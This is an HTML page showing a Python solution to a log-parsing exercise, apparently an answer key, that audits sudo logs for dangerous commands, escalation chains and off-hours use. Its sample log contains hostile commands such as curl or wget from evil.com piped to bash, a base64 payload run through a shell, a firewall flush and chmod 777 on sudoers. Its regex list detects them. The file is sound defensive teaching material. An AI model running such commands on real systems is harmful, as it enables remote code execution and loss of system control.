@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q13_sudo_audit.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q13_sudo_audit.py</h1>
+  <p class="file-path">Source: code\log_parsing\answers\q13_sudo_audit.py</p>
+  <p class="line-count">296 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+Q13. sudo / auditd Command Audit Parser
+=========================================
+Detect dangerous commands, privilege escalation chains, off-hours activity,
+and failed sudo followed by success from audit logs.
+
+=============================================================================
+SOLUTION PROGRESSION
+=============================================================================
+
+NAIVE: Grep for &quot;sudo&quot; and list commands.
+  Problem: Every sudo invocation would be listed. No detection logic,
+  no dangerous command patterns, no context.
+
+BETTER: Flag commands containing &quot;curl&quot; or &quot;wget&quot;.
+  Problem: `curl https://updates.example.com/check` is legitimate.
+  Need to detect the dangerous pattern: curl/wget piped to shell execution
+  or combined with base64 decode.
+
+GOOGLE-LEVEL (this file):
+  - Regex-based dangerous command patterns with justification for each.
+  - Privilege escalation chain: sudo → su → sudo within a TTY session.
+  - Off-hours detection with configurable window.
+  - Failed sudo → success within 60s: possible password enumeration.
+  - TTY-aware: track sessions per TTY to reconstruct chains.
+
+Complexity: O(N) parse, O(T × C) where T = TTYs, C = commands per TTY.
+=============================================================================
+&quot;&quot;&quot;
+
+import re
+import sys
+from collections import defaultdict
+from datetime import datetime, time as dtime
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAMPLE DATA
+# ─────────────────────────────────────────────────────────────────────────────
+
+SAMPLE_LOG = &quot;&quot;&quot;\
+Mar 12 08:00:00 srv1 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
+Mar 12 08:00:05 srv1 sudo: alice : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/su bob
+Mar 12 08:00:10 srv1 sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/shell.sh -O /tmp/shell.sh &amp;&amp; bash /tmp/shell.sh
+Mar 12 09:00:00 srv1 sudo: carol : TTY=pts/1 ; PWD=/home/carol ; USER=root ; COMMAND=/bin/chmod 777 /etc/sudoers
+Mar 12 09:01:00 srv1 sudo: dave : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/dd if=/dev/sda of=/tmp/disk.img
+Mar 12 09:02:00 srv1 sudo: eve : TTY=pts/3 ; PWD=/home/eve ; USER=root ; COMMAND=/usr/bin/curl -s http://evil.com/payload | bash
+Mar 12 09:03:00 srv1 sudo: frank : TTY=pts/4 ; PWD=/home/frank ; USER=root ; COMMAND=/bin/bash -c echo dGVzdA== | base64 -d | bash
+Mar 12 22:30:00 srv1 sudo: grace : TTY=pts/5 ; PWD=/home/grace ; USER=root ; COMMAND=/usr/bin/id
+Mar 12 10:00:00 srv1 sudo: heidi : TTY=pts/6 ; PWD=/home/heidi ; USER=root ; COMMAND=/sbin/iptables -F
+Mar 12 10:01:00 srv1 sudo: heidi : TTY=pts/6 ; PWD=/home/heidi ; USER=root ; COMMAND=/bin/chmod +s /usr/bin/find
+Mar 12 10:05:00 srv1 sudo(pam_unix): ivan : authentication failure; logname=ivan uid=1005 euid=0 tty=pts/7 ruser=ivan rhost= user=root
+Mar 12 10:05:30 srv1 sudo: ivan : TTY=pts/7 ; PWD=/home/ivan ; USER=root ; COMMAND=/bin/bash
+MALFORMED_LINE
+&quot;&quot;&quot;
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CONFIG
+# ─────────────────────────────────────────────────────────────────────────────
+
+BUSINESS_HOURS_START = dtime(9, 0)
+BUSINESS_HOURS_END   = dtime(18, 0)
+FAILED_SUCCESS_WINDOW_SECS = 60
+MONTH_MAP = {&quot;Jan&quot;:1,&quot;Feb&quot;:2,&quot;Mar&quot;:3,&quot;Apr&quot;:4,&quot;May&quot;:5,&quot;Jun&quot;:6,
+             &quot;Jul&quot;:7,&quot;Aug&quot;:8,&quot;Sep&quot;:9,&quot;Oct&quot;:10,&quot;Nov&quot;:11,&quot;Dec&quot;:12}
+REFERENCE_YEAR = 2024
+
+# Dangerous command patterns with descriptions
+DANGEROUS_PATTERNS: list[tuple[str, re.Pattern, str]] = [
+    (&quot;CHMOD_WORLD_WRITE&quot;,
+     re.compile(r&#x27;chmod\s+(777|o\+w)&#x27;, re.IGNORECASE),
+     &quot;world-writable permission grant&quot;),
+    (&quot;SETUID_BIT&quot;,
+     re.compile(r&#x27;chmod\s+[+]s|chmod\s+[0-9]*[246][0-9]{3}&#x27;, re.IGNORECASE),
+     &quot;setuid/setgid bit set — privilege escalation vector&quot;),
+    (&quot;DD_DISK_DUMP&quot;,
+     re.compile(r&#x27;\bdd\b.*if=/dev/&#x27;, re.IGNORECASE),
+     &quot;raw disk dump — potential data exfil&quot;),
+    (&quot;DOWNLOAD_EXEC&quot;,
+     re.compile(r&#x27;(wget|curl).*http.*[|&amp;]\s*(bash|sh|python|perl)&#x27;, re.IGNORECASE),
+     &quot;download and execute — common dropper pattern&quot;),
+    (&quot;BASE64_DECODE_EXEC&quot;,
+     re.compile(r&#x27;base64\s+-d.*[|&amp;]\s*(bash|sh)&#x27;, re.IGNORECASE),
+     &quot;base64 decode piped to shell — obfuscated payload&quot;),
+    (&quot;IPTABLES_FLUSH&quot;,
+     re.compile(r&#x27;iptables\s+-F&#x27;, re.IGNORECASE),
+     &quot;firewall rule flush — defence evasion&quot;),
+    (&quot;SU_COMMAND&quot;,
+     re.compile(r&#x27;(?:^|/)su\b\s+\w+&#x27;, re.IGNORECASE),
+     &quot;user substitution — possible privilege chain&quot;),
+    (&quot;SHELL_SPAWN&quot;,
+     re.compile(r&#x27;(?:^|/)(bash|sh|zsh|fish|dash)\s*$&#x27;, re.IGNORECASE),
+     &quot;interactive shell spawned as root&quot;),
+]
+
+# sudo success line
+SUDO_SUCCESS_RE = re.compile(
+    r&#x27;(?P&lt;month&gt;\w{3})\s+(?P&lt;day&gt;\d+)\s+(?P&lt;time&gt;\d{2}:\d{2}:\d{2})\s+&#x27;
+    r&#x27;\S+\s+sudo:\s+&#x27;
+    r&#x27;(?P&lt;user&gt;\S+)\s+:\s+TTY=(?P&lt;tty&gt;\S+)\s+;\s+PWD=(?P&lt;pwd&gt;\S+)\s+;\s+&#x27;
+    r&#x27;USER=(?P&lt;runas&gt;\S+)\s+;\s+COMMAND=(?P&lt;cmd&gt;.+)&#x27;
+)
+
+# sudo failure line
+SUDO_FAIL_RE = re.compile(
+    r&#x27;(?P&lt;month&gt;\w{3})\s+(?P&lt;day&gt;\d+)\s+(?P&lt;time&gt;\d{2}:\d{2}:\d{2})\s+&#x27;
+    r&#x27;\S+\s+sudo.*authentication failure.*tty=(?P&lt;tty&gt;\S+).*user=(?P&lt;user&gt;\S+)&#x27;,
+    re.IGNORECASE,
+)
+
+
+def parse_ts(month: str, day: str, time_str: str) -&gt; float:
+    return datetime(REFERENCE_YEAR, MONTH_MAP[month], int(day),
+                    *map(int, time_str.split(&quot;:&quot;))).timestamp()
+
+
+def parse_line(line: str) -&gt; dict | None:
+    line = line.strip()
+    if not line:
+        return None
+
+    # Try success
+    m = SUDO_SUCCESS_RE.match(line)
+    if m:
+        return {
+            &quot;event&quot;:  &quot;success&quot;,
+            &quot;ts&quot;:     parse_ts(m.group(&quot;month&quot;), m.group(&quot;day&quot;), m.group(&quot;time&quot;)),
+            &quot;user&quot;:   m.group(&quot;user&quot;),
+            &quot;tty&quot;:    m.group(&quot;tty&quot;),
+            &quot;runas&quot;:  m.group(&quot;runas&quot;),
+            &quot;cmd&quot;:    m.group(&quot;cmd&quot;).strip(),
+        }
+
+    # Try failure
+    m = SUDO_FAIL_RE.match(line)
+    if m:
+        return {
+            &quot;event&quot;: &quot;failure&quot;,
+            &quot;ts&quot;:    parse_ts(m.group(&quot;month&quot;), m.group(&quot;day&quot;), m.group(&quot;time&quot;)),
+            &quot;user&quot;:  m.group(&quot;user&quot;),
+            &quot;tty&quot;:   m.group(&quot;tty&quot;),
+            &quot;runas&quot;: &quot;root&quot;,
+            &quot;cmd&quot;:   &quot;&quot;,
+        }
+
+    return None
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DETECTORS
+# ─────────────────────────────────────────────────────────────────────────────
+
+def detect_dangerous_commands(records: list[dict]) -&gt; list[dict]:
+    alerts = []
+    for r in records:
+        if r[&quot;event&quot;] != &quot;success&quot;:
+            continue
+        for name, pattern, description in DANGEROUS_PATTERNS:
+            if pattern.search(r[&quot;cmd&quot;]):
+                alerts.append({
+                    &quot;type&quot;:        name,
+                    &quot;description&quot;: description,
+                    &quot;user&quot;:        r[&quot;user&quot;],
+                    &quot;runas&quot;:       r[&quot;runas&quot;],
+                    &quot;tty&quot;:         r[&quot;tty&quot;],
+                    &quot;cmd&quot;:         r[&quot;cmd&quot;],
+                    &quot;ts&quot;:          r[&quot;ts&quot;],
+                })
+    return alerts
+
+
+def detect_escalation_chain(records: list[dict]) -&gt; list[dict]:
+    &quot;&quot;&quot;Detect TTY session where sudo → su → another sudo occurs within 5 min.&quot;&quot;&quot;
+    tty_events: dict[str, list[dict]] = defaultdict(list)
+    for r in records:
+        if r[&quot;event&quot;] == &quot;success&quot;:
+            tty_events[r[&quot;tty&quot;]].append(r)
+
+    alerts = []
+    for tty, events in tty_events.items():
+        events_sorted = sorted(events, key=lambda x: x[&quot;ts&quot;])
+        # Look for su followed by another command, all within 5 minutes of first
+        has_su   = any(re.search(r&#x27;(?:^|/)su\b&#x27;, e[&quot;cmd&quot;]) for e in events_sorted)
+        has_sudo = len(events_sorted) &gt;= 3
+        if has_su and has_sudo:
+            duration = events_sorted[-1][&quot;ts&quot;] - events_sorted[0][&quot;ts&quot;]
+            if duration &lt;= 300:
+                chain = [f&quot;{e[&#x27;user&#x27;]}→{e[&#x27;runas&#x27;]}: {e[&#x27;cmd&#x27;][:40]}&quot; for e in events_sorted]
+                alerts.append({
+                    &quot;type&quot;:     &quot;ESCALATION_CHAIN&quot;,
+                    &quot;tty&quot;:      tty,
+                    &quot;duration&quot;: round(duration),
+                    &quot;chain&quot;:    chain,
+                    &quot;ts_start&quot;: events_sorted[0][&quot;ts&quot;],
+                })
+    return alerts
+
+
+def detect_off_hours(records: list[dict]) -&gt; list[dict]:
+    alerts = []
+    for r in records:
+        if r[&quot;event&quot;] != &quot;success&quot;:
+            continue
+        t = datetime.fromtimestamp(r[&quot;ts&quot;]).time()
+        if not (BUSINESS_HOURS_START &lt;= t &lt;= BUSINESS_HOURS_END):
+            alerts.append({
+                &quot;type&quot;: &quot;OFF_HOURS_SUDO&quot;,
+                &quot;user&quot;: r[&quot;user&quot;],
+                &quot;cmd&quot;:  r[&quot;cmd&quot;][:80],
+                &quot;tty&quot;:  r[&quot;tty&quot;],
+                &quot;ts&quot;:   r[&quot;ts&quot;],
+            })
+    return alerts
+
+
+def detect_fail_then_success(records: list[dict]) -&gt; list[dict]:
+    &quot;&quot;&quot;Failed sudo immediately followed by successful sudo within window.&quot;&quot;&quot;
+    user_failures: dict[str, list[float]] = defaultdict(list)
+    alerts = []
+
+    for r in sorted(records, key=lambda x: x[&quot;ts&quot;]):
+        user = r[&quot;user&quot;]
+        if r[&quot;event&quot;] == &quot;failure&quot;:
+            user_failures[user].append(r[&quot;ts&quot;])
+        elif r[&quot;event&quot;] == &quot;success&quot;:
+            recent = [t for t in user_failures[user]
+                      if r[&quot;ts&quot;] - FAILED_SUCCESS_WINDOW_SECS &lt;= t &lt; r[&quot;ts&quot;]]
+            if recent:
+                alerts.append({
+                    &quot;type&quot;:          &quot;FAIL_THEN_SUCCESS&quot;,
+                    &quot;user&quot;:          user,
+                    &quot;cmd&quot;:           r[&quot;cmd&quot;],
+                    &quot;success_ts&quot;:    r[&quot;ts&quot;],
+                    &quot;failure_count&quot;: len(recent),
+                    &quot;gap_secs&quot;:      round(r[&quot;ts&quot;] - min(recent), 1),
+                })
+    return alerts
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# REPORT
+# ─────────────────────────────────────────────────────────────────────────────
+
+def ts_fmt(ts: float) -&gt; str:
+    return datetime.fromtimestamp(ts).strftime(&quot;%Y-%m-%dT%H:%M:%S&quot;)
+
+
+def print_report(dangerous, escalation, off_hours, fail_success) -&gt; None:
+    print(&quot;=&quot; * 65)
+    print(&quot;SUDO / AUDITD COMMAND AUDIT REPORT&quot;)
+    print(&quot;=&quot; * 65)
+
+    print(f&quot;\n[DANGEROUS_COMMANDS] {len(dangerous)} alert(s)&quot;)
+    for a in dangerous:
+        print(f&quot;  [{a[&#x27;type&#x27;]}] {a[&#x27;description&#x27;]}&quot;)
+        print(f&quot;    user={a[&#x27;user&#x27;]} runas={a[&#x27;runas&#x27;]} tty={a[&#x27;tty&#x27;]} ts={ts_fmt(a[&#x27;ts&#x27;])}&quot;)
+        print(f&quot;    cmd: {a[&#x27;cmd&#x27;][:100]}&quot;)
+
+    print(f&quot;\n[ESCALATION_CHAIN] {len(escalation)} alert(s)&quot;)
+    for a in escalation:
+        print(f&quot;  tty={a[&#x27;tty&#x27;]}  duration={a[&#x27;duration&#x27;]}s  ts={ts_fmt(a[&#x27;ts_start&#x27;])}&quot;)
+        for step in a[&quot;chain&quot;]:
+            print(f&quot;    {step}&quot;)
+
+    print(f&quot;\n[OFF_HOURS_SUDO] {len(off_hours)} alert(s)&quot;)
+    for a in off_hours:
+        print(f&quot;  user={a[&#x27;user&#x27;]}  ts={ts_fmt(a[&#x27;ts&#x27;])}  cmd={a[&#x27;cmd&#x27;][:80]}&quot;)
+
+    print(f&quot;\n[FAIL_THEN_SUCCESS] {len(fail_success)} alert(s)&quot;)
+    for a in fail_success:
+        print(f&quot;  user={a[&#x27;user&#x27;]}  failures={a[&#x27;failure_count&#x27;]}  &quot;
+              f&quot;gap={a[&#x27;gap_secs&#x27;]}s  success_at={ts_fmt(a[&#x27;success_ts&#x27;])}&quot;)
+        print(f&quot;    cmd: {a[&#x27;cmd&#x27;][:80]}&quot;)
+    print(&quot;=&quot; * 65)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+if __name__ == &quot;__main__&quot;:
+    if len(sys.argv) &gt; 1:
+        with open(sys.argv[1], encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as fh:
+            raw_lines = fh.readlines()
+    else:
+        print(&quot;[INFO] Using embedded sample data.\n&quot;)
+        raw_lines = SAMPLE_LOG.splitlines(keepends=True)
+
+    records = [r for r in (parse_line(l) for l in raw_lines) if r is not None]
+    print(f&quot;Parsed {len(records)} sudo audit events.\n&quot;)
+    print_report(
+        detect_dangerous_commands(records),
+        detect_escalation_chain(records),
+        detect_off_hours(records),
+        detect_fail_then_success(records),
+    )
+</code></pre>
+</body>
+</html>
